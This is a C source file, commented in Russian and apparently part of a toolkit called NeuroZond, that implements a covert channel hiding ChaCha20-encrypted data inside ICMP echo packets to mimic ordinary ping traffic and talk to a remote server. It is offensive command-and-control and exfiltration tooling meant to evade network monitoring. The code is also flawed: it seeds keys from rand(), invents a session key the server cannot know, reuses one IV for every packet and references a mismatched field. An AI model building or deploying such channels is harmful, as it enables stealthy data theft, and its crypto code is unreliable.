/**
 * @file icmp_channel.c
 * @brief Реализация ICMP канала для скрытой передачи данных
 * 
 * Этот модуль реализует скрытый канал связи, используя ICMP эхо-запросы
 * и ответы. Данные шифруются с помощью ChaCha20 и встраиваются в поле данных
 * ICMP пакетов, имитируя обычный ping-трафик.
 * 
 * @author NeuroZond Team
 * @date 2025-04-28
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <netdb.h>

#include "covert_channel.h"
#include "../crypto/crypto_utils.h"

/* Константы для ICMP канала */
#define ICMP_HEADER_SIZE 8
#define MAX_ICMP_DATA_SIZE 1024
#define DEFAULT_ICMP_PORT 0 /* ICMP не использует порты */
#define ICMP_ECHO_REQUEST 8
#define ICMP_ECHO_REPLY 0
#define ICMP_TIMEOUT_SECS 5
#define SESSION_ID_LENGTH 8

/* Структура для хранения конфигурации ICMP канала */
typedef struct {
    char *server_addr;
    int socket_fd;
    struct sockaddr_in server_sockaddr;
    unsigned char session_id[SESSION_ID_LENGTH];
    unsigned char key[32]; /* 256-бит ключ для ChaCha20 */
    unsigned char iv[16];  /* 128-бит IV для ChaCha20 */
    int sequence_number;
    bool connected;
    unsigned int min_jitter_ms;
    unsigned int max_jitter_ms;
} IcmpChannelConfig;

/* Функция для вычисления контрольной суммы ICMP пакета */
static unsigned short icmp_checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return (unsigned short)(~sum);
}

/* Создание ICMP эхо-запроса */
static void create_icmp_packet(struct icmp *icmp_hdr, int seq, 
                       const unsigned char *data, size_t data_len) {
    memset(icmp_hdr, 0, sizeof(struct icmp));
    
    icmp_hdr->icmp_type = ICMP_ECHO_REQUEST;
    icmp_hdr->icmp_code = 0;
    icmp_hdr->icmp_id = htons(getpid() & 0xFFFF);
    icmp_hdr->icmp_seq = htons(seq);
    
    /* Копируем данные в ICMP пакет */
    if (data && data_len > 0) {
        memcpy(icmp_hdr->icmp_data, data, data_len);
    }
    
    /* Вычисляем контрольную сумму */
    icmp_hdr->icmp_cksum = 0;
    icmp_hdr->icmp_cksum = icmp_checksum((unsigned short *)icmp_hdr, 
                                         ICMP_HEADER_SIZE + data_len);
}

/* Функция для генерации случайных данных */
static void generate_random_data(unsigned char *buffer, size_t length) {
    for (size_t i = 0; i < length; i++) {
        buffer[i] = rand() % 256;
    }
}

/* Инициализация ICMP канала */
static void *icmp_channel_init_internal(const covert_channel_config *config) {
    if (!config || !config->server_addr) {
        return NULL;
    }
    
    /* Выделяем память для структуры конфигурации ICMP канала */
    IcmpChannelConfig *channel_config = (IcmpChannelConfig *)malloc(sizeof(IcmpChannelConfig));
    if (!channel_config) {
        return NULL;
    }
    
    /* Инициализируем поля структуры */
    memset(channel_config, 0, sizeof(IcmpChannelConfig));
    
    /* Устанавливаем адрес сервера */
    channel_config->server_addr = strdup(config->c1_address);
    if (!channel_config->server_addr) {
        free(channel_config);
        return NULL;
    }
    
    /* Создаем raw socket для отправки ICMP пакетов */
    channel_config->socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (channel_config->socket_fd < 0) {
        /* Требуются права root для создания raw socket */
        free(channel_config->server_addr);
        free(channel_config);
        return NULL;
    }
    
    /* Настраиваем адрес сервера */
    struct hostent *host = gethostbyname(config->server_addr);
    if (!host) {
        close(channel_config->socket_fd);
        free(channel_config->server_addr);
        free(channel_config);
        return NULL;
    }
    
    memset(&channel_config->server_sockaddr, 0, sizeof(struct sockaddr_in));
    channel_config->server_sockaddr.sin_family = AF_INET;
    channel_config->server_sockaddr.sin_addr = *((struct in_addr *)host->h_addr);
    
    /* Генерируем случайный идентификатор сессии */
    generate_random_data(channel_config->session_id, SESSION_ID_LENGTH);
    
    /* Генерируем ключ и IV для шифрования */
    generate_random_data(channel_config->key, sizeof(channel_config->key));
    generate_random_data(channel_config->iv, sizeof(channel_config->iv));
    
    /* Инициализируем счетчик последовательности */
    channel_config->sequence_number = 1;
    
    /* Устанавливаем значения джиттера по умолчанию */
    channel_config->min_jitter_ms = config->jitter_min;
    channel_config->max_jitter_ms = config->jitter_max;
    
    /* Инициализируем генератор случайных чисел */
    srand((unsigned int)time(NULL));
    
    /* Настраиваем таймаут для сокета */
    struct timeval tv;
    tv.tv_sec = ICMP_TIMEOUT_SECS;
    tv.tv_usec = 0;
    setsockopt(channel_config->socket_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    return channel_config;
}

/* Установление соединения через ICMP канал */
static bool icmp_channel_connect(void *channel_data) {
    IcmpChannelConfig *config = (IcmpChannelConfig *)channel_data;
    
    if (!config || config->socket_fd < 0) {
        return false;
    }
    
    /* Отправляем начальный ICMP пакет с идентификатором сессии */
    unsigned char packet[ICMP_HEADER_SIZE + SESSION_ID_LENGTH];
    struct icmp *icmp_hdr = (struct icmp *)packet;
    
    /* Создаем пакет с идентификатором сессии */
    create_icmp_packet(icmp_hdr, config->sequence_number++, 
                     config->session_id, SESSION_ID_LENGTH);
    
    /* Отправляем пакет */
    int bytes_sent = sendto(config->socket_fd, packet, sizeof(packet), 0,
                          (struct sockaddr *)&config->server_sockaddr,
                          sizeof(struct sockaddr_in));
    
    if (bytes_sent <= 0) {
        return false;
    }
    
    /* Ожидаем ответ от сервера */
    unsigned char recv_buffer[MAX_ICMP_DATA_SIZE];
    struct sockaddr_in from;
    socklen_t fromlen = sizeof(from);
    
    int bytes_received = recvfrom(config->socket_fd, recv_buffer, sizeof(recv_buffer),
                                0, (struct sockaddr *)&from, &fromlen);
    
    if (bytes_received <= 0) {
        return false;
    }
    
    /* Успешное соединение */
    config->connected = 1;
    return true;
}

/* Отправка данных через ICMP канал */
static size_t icmp_channel_send(void *channel_data, const unsigned char *data, size_t data_len) {
    IcmpChannelConfig *config = (IcmpChannelConfig *)channel_data;
    
    if (!config || !data || data_len == 0 || !config->connected) {
        return 0;
    }
    
    /* Максимальный размер данных, который можно отправить в одном пакете */
    size_t max_chunk_size = MAX_ICMP_DATA_SIZE - ICMP_HEADER_SIZE - SESSION_ID_LENGTH;
    size_t remaining = data_len;
    size_t offset = 0;
    
    while (remaining > 0) {
        /* Размер текущего чанка */
        size_t chunk_size = (remaining > max_chunk_size) ? max_chunk_size : remaining;
        
        /* Буфер для шифрованных данных */
        unsigned char encrypted_data[MAX_ICMP_DATA_SIZE];
        
        /* Копируем идентификатор сессии в начало данных */
        memcpy(encrypted_data, config->session_id, SESSION_ID_LENGTH);
        
        /* Шифруем данные */
        size_t encrypted_chunk_len = MAX_ICMP_DATA_SIZE - SESSION_ID_LENGTH;
        CryptoContext *ctx = crypto_init(CRYPTO_CHACHA20, config->key, sizeof(config->key), config->iv, sizeof(config->iv));
        if (!ctx) {
             fprintf(stderr, "ICMP Send: Failed to init crypto context\n");
             return 0;
        }
        if (crypto_encrypt(ctx, data + offset, chunk_size, encrypted_data + SESSION_ID_LENGTH, &encrypted_chunk_len) != 0) {
             fprintf(stderr, "ICMP Send: Encryption failed\n");
             crypto_cleanup(ctx);
             return 0;
        }
        crypto_cleanup(ctx);
        
        /* Создаем ICMP пакет с шифрованными данными */
        unsigned char packet[MAX_ICMP_DATA_SIZE];
        struct icmp *icmp_hdr = (struct icmp *)packet;
        
        create_icmp_packet(icmp_hdr, config->sequence_number++,
                         encrypted_data, SESSION_ID_LENGTH + encrypted_chunk_len);
        
        /* Отправляем пакет */
        int bytes_sent = sendto(config->socket_fd, packet, 
                              ICMP_HEADER_SIZE + SESSION_ID_LENGTH + encrypted_chunk_len,
                              0, (struct sockaddr *)&config->server_sockaddr,
                              sizeof(struct sockaddr_in));
        
        if (bytes_sent <= 0) {
            return offset;
        }
        
        /* Ожидаем подтверждения от сервера */
        unsigned char recv_buffer[MAX_ICMP_DATA_SIZE];
        struct sockaddr_in from;
        socklen_t fromlen = sizeof(from);
        
        int bytes_received = recvfrom(config->socket_fd, recv_buffer, sizeof(recv_buffer),
                                    0, (struct sockaddr *)&from, &fromlen);
        
        if (bytes_received <= 0) {
            /* Таймаут или ошибка, пробуем снова */
            continue;
        }
        
        /* Обновляем счетчики */
        offset += chunk_size;
        remaining -= chunk_size;
    }
    
    return data_len;
}

/* Получение данных через ICMP канал */
static size_t icmp_channel_receive(void *channel_data, unsigned char *buffer, size_t buffer_size) {
    IcmpChannelConfig *config = (IcmpChannelConfig *)channel_data;
    
    if (!config || !buffer || buffer_size == 0 || !config->connected) {
        return 0;
    }
    
    /* Отправляем запрос на получение данных */
    unsigned char request_packet[ICMP_HEADER_SIZE + SESSION_ID_LENGTH];
    struct icmp *icmp_hdr = (struct icmp *)request_packet;
    
    /* Создаем пакет с идентификатором сессии */
    create_icmp_packet(icmp_hdr, config->sequence_number++, 
                     config->session_id, SESSION_ID_LENGTH);
    
    /* Отправляем пакет */
    int bytes_sent = sendto(config->socket_fd, request_packet, sizeof(request_packet),
                          0, (struct sockaddr *)&config->server_sockaddr,
                          sizeof(struct sockaddr_in));
    
    if (bytes_sent <= 0) {
        return 0;
    }
    
    /* Буфер для получения данных */
    unsigned char recv_buffer[MAX_ICMP_DATA_SIZE];
    struct sockaddr_in from;
    socklen_t fromlen = sizeof(from);
    
    /* Получаем ответ от сервера */
    int bytes_received = recvfrom(config->socket_fd, recv_buffer, sizeof(recv_buffer),
                                0, (struct sockaddr *)&from, &fromlen);
    
    if (bytes_received <= 0) {
        return 0;
    }
    
    /* Отбрасываем IP заголовок (обычно 20 байт) */
    struct ip *ip_header = (struct ip *)recv_buffer;
    int ip_header_len = ip_header->ip_hl << 2;
    
    /* ICMP заголовок находится после IP заголовка */
    struct icmp *icmp_reply = (struct icmp *)(recv_buffer + ip_header_len);
    
    /* Проверяем, что это ICMP ECHO REPLY */
    if (icmp_reply->icmp_type != ICMP_ECHO_REPLY) {
        return 0;
    }
    
    /* Данные находятся после ICMP заголовка */
    unsigned char *icmp_data = (unsigned char *)icmp_reply->icmp_data;
    int data_len = bytes_received - ip_header_len - ICMP_HEADER_SIZE;
    
    /* Проверяем, что длина данных больше идентификатора сессии */
    if (data_len <= SESSION_ID_LENGTH) {
        return 0;
    }
    
    /* Проверяем идентификатор сессии */
    if (memcmp(icmp_data, config->session_id, SESSION_ID_LENGTH) != 0) {
        return 0;
    }
    
    /* Длина полезных данных */
    int payload_len = data_len - SESSION_ID_LENGTH;
    
    /* Проверяем размер буфера */
    if (payload_len <= 0) {
        fprintf(stderr, "ICMP Receive: Invalid payload length %d\n", payload_len);
        return 0;
    }

    size_t decrypted_len = (size_t)buffer_size;
    if (payload_len > (int)decrypted_len) {
        fprintf(stderr, "ICMP Receive: Buffer too small (%zu) for payload (%d)\n", buffer_size, payload_len);
        return 0;
    }
    
    /* Расшифровываем данные */
    CryptoContext *ctx = crypto_init(CRYPTO_CHACHA20, config->key, sizeof(config->key), config->iv, sizeof(config->iv));
    if (!ctx) {
        fprintf(stderr, "ICMP Receive: Failed to init crypto context\n");
        return 0;
    }
    if (crypto_decrypt(ctx, icmp_data + SESSION_ID_LENGTH, payload_len, buffer, &decrypted_len) != 0) {
        fprintf(stderr, "ICMP Receive: Decryption failed\n");
        crypto_cleanup(ctx);
        return 0;
    }
    crypto_cleanup(ctx);

    return decrypted_len;
}

/* Проверка состояния соединения */
static bool icmp_channel_is_connected(void *channel_data) {
    IcmpChannelConfig *config = (IcmpChannelConfig *)channel_data;
    return (config && config->connected);
}

/* Установка параметров джиттера (обновляет только внутреннее состояние) */
static void icmp_channel_set_jitter_internal(void *channel_data, unsigned int min_jitter_ms, unsigned int max_jitter_ms) {
    IcmpChannelConfig *config = (IcmpChannelConfig *)channel_data;
    if (config && max_jitter_ms >= min_jitter_ms) {
    config->min_jitter_ms = min_jitter_ms;
    config->max_jitter_ms = max_jitter_ms;
    }
}

/* Освобождение ресурсов ICMP канала */
static void icmp_channel_cleanup_internal(void *channel_data) {
    IcmpChannelConfig *config = (IcmpChannelConfig *)channel_data;
    
    if (!config) {
        return;
    }
    
    /* Закрываем сокет */
    if (config->socket_fd >= 0) {
        close(config->socket_fd);
    }
    
    /* Освобождаем память */
    free(config->server_addr);
    
    /* Очищаем чувствительные данные */
    memset(config->key, 0, sizeof(config->key));
    memset(config->iv, 0, sizeof(config->iv));
    
    /* Освобождаем память структуры */
    free(config);
}

/* Регистрация обработчика для ICMP канала */
void register_icmp_channel_handler(CovertChannelHandler *handler) {
    if (!handler) {
        return;
    }
    
    handler->init = icmp_channel_init_internal;
    handler->connect = icmp_channel_connect;
    handler->send = icmp_channel_send;
    handler->receive = icmp_channel_receive;
    handler->cleanup = icmp_channel_cleanup_internal;
    handler->set_jitter = icmp_channel_set_jitter_internal;
    handler->is_connected = icmp_channel_is_connected;
} 